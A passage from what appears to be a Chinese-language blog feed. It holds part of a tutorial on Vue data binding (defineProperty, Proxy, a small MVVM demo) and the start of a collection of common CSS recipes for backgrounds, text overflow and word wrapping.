'text', {    get: function() {    },    set: function(newVal) {      console.log('set val:' + newVal);      document.getElementById('input').value = newVal;      document.getElementById('span').innerHTML = newVal;    }  });  const input = document.getElementById('input');  input.addEventListener('keyup', function(e){    obj.text = e.target.value;  })</script><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"input"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"span"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> obj = &#123;&#125;;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">Object</span>.defineProperty(obj, <span class="string">'text'</span>, &#123;</span></span><br><span class="line"><span class="javascript">    get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="javascript">    set: <span class="function"><span class="keyword">function</span>(<span class="params">newVal</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">console</span>.log(<span class="string">'set val:'</span> + newVal);</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.getElementById(<span class="string">'input'</span>).value = newVal;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.getElementById(<span class="string">'span'</span>).innerHTML = newVal;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> input = <span class="built_in">document</span>.getElementById(<span class="string">'input'</span>);</span></span><br><span class="line"><span class="javascript">  input.addEventListener(<span class="string">'keyup'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">    obj.text = e.target.value;</span></span><br><span class="line"><span class="undefined">  &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2018/11/14/Vue数据绑定/3.png"></p><p><br></p><h4 id="3-2-检查变化的缺陷"><a href="#3-2-检查变化的缺陷" class="headerlink" title="3.2 检查变化的缺陷"></a>3.2 检查变化的缺陷</h4><p>受现代JS的限制</p><ul><li>Vue不允许动态添加根级别的响应式属性</li><li><p>Vue无法检测到对象属性的添加或删除<br>你可能需要为已有对象赋值多个新属性，如<code>Object.assign()</code>或<code>_.extend()</code>，但这样添加到对象上的新属性不会触发更新。这时，可以使用这个实例方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// this.$set实例方法</span></span><br><span class="line"><span class="keyword">this</span>.$set(<span class="keyword">this</span>.someObject, <span class="string">'b'</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个新对象</span></span><br><span class="line"><span class="keyword">this</span>.someObject = <span class="built_in">Object</span>.assign(&#123;&#125;, <span class="keyword">this</span>.someObject, &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>&#125;)</span><br></pre></td></tr></table></figure></li><li><p>Vue不能检测以下数组的变动：<br>利用索引直接设置一个数组项时<code>vm.items[index] = newVal</code><br>修改数组的长度时 <code>vm.items.length = newLen</code><br>Vue将被监听的数组的变异方法进行了包裹，它们也将会触发试图更新。这些方法包括push, pop, shift, unshift, splice, sort, reverse。相比之下，也有非变异方法，它们不会改变原始数组，而总是返回一个新的数组。这时，可以用新数组替换旧数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.arr = thia.arr.filter(<span class="function">(<span class="params">item</span>) =&gt;</span> item.key)</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="4-proxy"><a href="#4-proxy" class="headerlink" title="4. proxy"></a>4. proxy</h3><p>在Vue2.0中，数据双向绑定就是通过<code>Object.defineProperty</code>去监听对象的每一个属性，然后在get,set方法中通过发布订阅者模式来实现的数据响应，但是存在一定的缺陷，比如只能监听已存在的属性，对于新增删除属性就无能为力了，同时无法监听数组的变化，所以在Vue3.0中将其换成了功能更强大的<code>Proxy</code>。</p><ul><li>Object.defineProperty监听的是对象的每一个属性，而Proxy监听的是对象自身</li><li>使用Object.defineProperty需要遍历对象的每一个属性，对于性能会有一定的影响</li><li>Proxy对新增的属性也能监听到，但Object.defineProperty无法监听到。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> handler = &#123;</span><br><span class="line">    get: <span class="function">(<span class="params">target, propkey</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`监听到<span class="subst">$&#123;propkey&#125;</span>被取啦,值为:<span class="subst">$&#123;target[propkey]&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">return</span> target[propkey];</span><br><span class="line">    &#125;,</span><br><span class="line">    set: <span class="function">(<span class="params">target, propkey, value</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(target[propkey] !== value)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`监听到<span class="subst">$&#123;propkey&#125;</span>变化啦,值变为:<span class="subst">$&#123;value&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">this</span>.data = <span class="keyword">new</span> <span class="built_in">Proxy</span>(<span class="keyword">this</span>.data, handler);</span><br></pre></td></tr></table></figure><p><br></p><h3 id="5-依赖收集"><a href="#5-依赖收集" class="headerlink" title="5. 依赖收集"></a>5. 依赖收集</h3><p>这看上去很简单，但是它背后又潜藏着几个要处理的问题：</p><ul><li>怎样只更新和<code>message</code>有关的DOM</li><li>不想在每个 setter 方法里一个个写 DOM操作</li><li>data对象 中key: [virtualDom1, virtualDom2, …]一一对应？</li><li>怎样统一收集这个对应关系？</li></ul><ul><li>我们的数据、方法和DOM都是耦合在一起</li><li>我们只监听了一个属性,一个对象不可能只有一个属性,我们需要对对象每个属性进行监听</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"&#123;&#123; message &#125;&#125;"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>模板渲染时，渲染到需要读取this.$data.message的值，触发了getter函数。此时，我们可以把message这个变量和所在的元素绑定起来。一个变量就可以对应多个元素，我们<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = &#123;</span><br><span class="line">  key1: val1,</span><br><span class="line">  key2: val2,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Dep = &#123;</span><br><span class="line">  key1: [virtualDom1, virtualDom2, virtualDom3, ...],</span><br><span class="line">  key1: [virtualDom1, virtualDom4, ...],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当key1被修改时，setting 根据 Dep 找到跟key1相对应的元素，只更新这一部分的UI。</p><p><img src="/2018/11/14/Vue数据绑定/2.png"></p><p><br></p><h3 id="6-实现MVVM-Demo"><a href="#6-实现MVVM-Demo" class="headerlink" title="6. 实现MVVM Demo"></a>6. 实现MVVM Demo</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Two-way data-binding<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-model</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line">        &#123;&#123; text &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">observe</span> (<span class="params">obj, vm</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">Object</span>.keys(obj).forEach(<span class="function"><span class="keyword">function</span> (<span class="params">key</span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">                defineReactive(vm, key, obj[key]);</span></span><br><span class="line"><span class="undefined">            &#125;);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">defineReactive</span> (<span class="params">obj, key, val</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> dep = <span class="keyword">new</span> Dep();</span></span><br><span class="line"><span class="javascript">            <span class="built_in">Object</span>.defineProperty(obj, key, &#123;</span></span><br><span class="line"><span class="javascript">                get: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span> (Dep.target) dep.addSub(Dep.target);</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> val</span></span><br><span class="line"><span class="undefined">                &#125;,</span></span><br><span class="line"><span class="javascript">                set: <span class="function"><span class="keyword">function</span> (<span class="params">newVal</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span> (newVal === val) <span class="keyword">return</span></span></span><br><span class="line"><span class="undefined">                    val = newVal;</span></span><br><span class="line"><span class="undefined">                    dep.notify();</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">            &#125;);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">nodeToFragment</span> (<span class="params">node, vm</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> flag = <span class="built_in">document</span>.createDocumentFragment();</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> child;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">while</span> (child = node.firstChild) &#123;</span></span><br><span class="line"><span class="undefined">                compile(child, vm);</span></span><br><span class="line"><span class="undefined">                flag.appendChild(child);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> flag;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">compile</span> (<span class="params">node, vm</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\&#123;\&#123;(.*)\&#125;\&#125;/</span>;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 节点类型为元素</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (node.nodeType === <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> attr = node.attributes;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 解析属性</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; attr.length; i++) &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span> (attr[i].nodeName == <span class="string">'v-model'</span>) &#123;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">var</span> name = attr[i].nodeValue; <span class="comment">// 获取v-model绑定的属性名</span></span></span><br><span class="line"><span class="javascript">                        node.addEventListener(<span class="string">'input'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                            <span class="comment">// 给相应的data属性赋值，进而触发该属性的set方法</span></span></span><br><span class="line"><span class="undefined">                            vm[name] = e.target.value;</span></span><br><span class="line"><span class="undefined">                        &#125;);</span></span><br><span class="line"><span class="javascript">                        node.value = vm[name]; <span class="comment">// 将data的值赋给该node</span></span></span><br><span class="line"><span class="javascript">                        node.removeAttribute(<span class="string">'v-model'</span>);</span></span><br><span class="line"><span class="undefined">                    &#125;</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">new</span> Watcher(vm, node, name, <span class="string">'input'</span>);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 节点类型为text</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (node.nodeType === <span class="number">3</span>) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (reg.test(node.nodeValue)) &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">var</span> name = <span class="built_in">RegExp</span>.$<span class="number">1</span>; <span class="comment">// 获取匹配到的字符串</span></span></span><br><span class="line"><span class="undefined">                    name = name.trim();</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">new</span> Watcher(vm, node, name, <span class="string">'text'</span>);</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">Watcher</span> (<span class="params">vm, node, name, nodeType</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//  this为watcher函数</span></span></span><br><span class="line"><span class="javascript">            Dep.target = <span class="keyword">this</span>;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//  console.log(this);</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.name = name;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.node = node;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.vm = vm;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.nodeType = nodeType;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.update();</span></span><br><span class="line"><span class="javascript">            Dep.target = <span class="literal">null</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        Watcher.prototype = &#123;</span></span><br><span class="line"><span class="javascript">            update: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">this</span>.get();</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (<span class="keyword">this</span>.nodeType == <span class="string">'text'</span>) &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">this</span>.node.nodeValue = <span class="keyword">this</span>.value;</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (<span class="keyword">this</span>.nodeType == <span class="string">'input'</span>) &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">this</span>.node.value = <span class="keyword">this</span>.value;</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 获取daa中的属性值</span></span></span><br><span class="line"><span class="javascript">            get: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">this</span>.value = <span class="keyword">this</span>.vm[<span class="keyword">this</span>.name]; <span class="comment">// 触发相应属性的get</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">Dep</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.subs = []</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        Dep.prototype = &#123;</span></span><br><span class="line"><span class="javascript">            addSub: <span class="function"><span class="keyword">function</span>(<span class="params">sub</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">this</span>.subs.push(sub);</span></span><br><span class="line"><span class="undefined">            &#125;,</span></span><br><span class="line"><span class="javascript">            notify: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">this</span>.subs.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">sub</span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">                    sub.update();</span></span><br><span class="line"><span class="undefined">                &#125;);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">Vue</span> (<span class="params">options</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.data = options.data;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> data = <span class="keyword">this</span>.data;</span></span><br><span class="line"><span class="javascript">            observe(data, <span class="keyword">this</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> id = options.el;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> dom = nodeToFragment(<span class="built_in">document</span>.getElementById(id), <span class="keyword">this</span>);</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 编译完成后，将dom返回到app中</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(id).appendChild(dom);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">            el: <span class="string">'app'</span>,</span></span><br><span class="line"><span class="undefined">            data: &#123;</span></span><br><span class="line"><span class="javascript">                text: <span class="string">'hello world'</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;);</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://zhuanlan.zhihu.com/p/38296857" target="_blank" rel="noopener">简单理解MVVM–实现Vue的MVVM模式</a></li><li><a href="https://blog.devtang.com/2015/11/02/mvc-and-mvvm/" target="_blank" rel="noopener">被误解的 MVC</a></li><li><a href="https://juejin.im/post/5b2f0769e51d45589f46949e" target="_blank" rel="noopener">Vue.js中的MVVM</a></li><li><a href="https://juejin.im/post/5b82b174518825431079d473" target="_blank" rel="noopener">Vue.js的响应式系统原理</a></li><li><a href="https://ustbhuangyi.github.io/vue-analysis/data-driven/" target="_blank" rel="noopener">Vue技术揭秘</a></li><li><a href="https://www.jianshu.com/p/2df6dcddb0d7" target="_blank" rel="noopener">实现双向绑定Proxy比defineproperty优劣如何</a></li><li><a href="https://juejin.im/post/5dc267b15188255f6d42bd1a" target="_blank" rel="noopener">使用proxy实现一个双向绑定</a></li></ul>]]></content>
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CSS常用实例</title>
      <link href="/2018/11/06/CSS-example/"/>
      <url>/2018/11/06/CSS-example/</url>
      <content type="html"><![CDATA[<h4 id="1-全屏背景"><a href="#1-全屏背景" class="headerlink" title="1. 全屏背景"></a>1. 全屏背景</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">body&#123;</span><br><span class="line">  background-image: url(1.png);         // 背景图路径</span><br><span class="line">  background-position: center center;   // 背景图垂直水平居中</span><br><span class="line">  background-repeat: no-repeat;         // 不平铺</span><br><span class="line">  background-attachment: fixed;         // 当内容高度大于图片高度时，背景图像的位置相对于viewport固定</span><br><span class="line">  background-size: cover;               // 背景图基于容器大小伸缩</span><br><span class="line">  background-color: #fff;               // 背景图加载过程中显示的背景色</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-单行溢出"><a href="#2-单行溢出" class="headerlink" title="2. 单行溢出"></a>2. 单行溢出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a&#123;</span><br><span class="line">  max-width: 100px;        // 固定宽度</span><br><span class="line">  white-space: nowrap;     // 禁止换行</span><br><span class="line">  overflow: hidden;        // 隐藏溢出文本</span><br><span class="line">  text-overflow: ellipsis; // 超出部分显示...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-多行溢出"><a href="#3-多行溢出" class="headerlink" title="3. 多行溢出"></a>3. 多行溢出</h4><style>.content {  width: 80%;  max-height: 40px;  position: relative;  line-height: 1.4em;  overflow: hidden;  color: #4788C7;}.content::after {  content: "...";  position: absolute;  bottom: 0;  right: 0;  padding-left: 40px;  background: -webkit-linear-gradient(left, transparent, #fff 55%);  background: -o-linear-gradient(right, transparent, #fff 55%);  background: -moz-linear-gradient(right, transparent, #fff 55%);  background: linear-gradient(to right, transparent, #fff 55%);}</style><div class="content">多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出</div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.content &#123;</span><br><span class="line">  width: 80%;</span><br><span class="line">  max-height: 40px;</span><br><span class="line">  position: relative;</span><br><span class="line">  line-height: 1.4em;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.content::after &#123;</span><br><span class="line">  content: &quot;...&quot;;</span><br><span class="line">  position: absolute;</span><br><span class="line">  bottom: 0;</span><br><span class="line">  right: 0;</span><br><span class="line">  padding-left: 40px;</span><br><span class="line">  background: -webkit-linear-gradient(left, transparent, #fff 55%);</span><br><span class="line">  background: -o-linear-gradient(right, transparent, #fff 55%);</span><br><span class="line">  background: -moz-linear-gradient(right, transparent, #fff 55%);</span><br><span class="line">  background: linear-gradient(to right, transparent, #fff 55%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="4-自动换行"><a href="#4-自动换行" class="headerlink" title="4. 自动换行"></a>4. 自动换行</h4><p><code>word-wrap</code>可以控制换行，当取值<code>break-word</code>时将强制换行，中英文文本都无任何问题，但是对长串的英文不起作用。也就是说<code>break-word</code>是用来断词而不是断字符。而<code>word-break</code>取值为<code>break-all</code>时，可允许非亚洲语言文本的任意字符断开。</p><p>一般来说，使用<code>word-wrap:break-word</code>声明可以确保所有文本正常显示。但在Firefox浏览器上，长串英文会出现问题(不换行)。为了解决长串英文问题，一般将<code>word-wrap: break-word; word-break: break-all</code>一起使用。但是这样又造成了一个新的问题，会导致普通英文语句中的单词断行影响阅读。</p><p>综上所述，主要问题是长串英文不换行和英文单词会被断开。两者选一，应该使用<code>word-wrap: break-word; overflow:hidden</code>结合，而不是<code>word-wrap: break-word; word-break:break-all</code>结合。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">element&#123;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">  word-wrap: break-word;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-flex-上中下布局"><a href="#5-flex-上中下布局" class="headerlink" title="5. flex:上中下布局"></a>5. flex:上中下布局</h4><p>Chrome, Firefox, Safari, IE11, IE10有效<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 